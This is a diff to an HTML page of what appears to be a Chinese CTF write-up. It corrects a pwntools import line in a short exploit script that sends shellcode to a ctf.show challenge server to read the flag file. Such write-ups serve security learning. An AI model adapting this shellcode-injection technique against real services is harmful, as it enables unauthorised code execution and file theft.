@@ -539,7 +539,7 @@
 <blockquote>
 <p>exp如下（cat写法）</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn <span class="keyword">from</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28110</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span>+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28110</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span>+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>因为flag在文件&#x2F;flag里，所以这里我们就使用cat，当然也可以使用ORW</li>
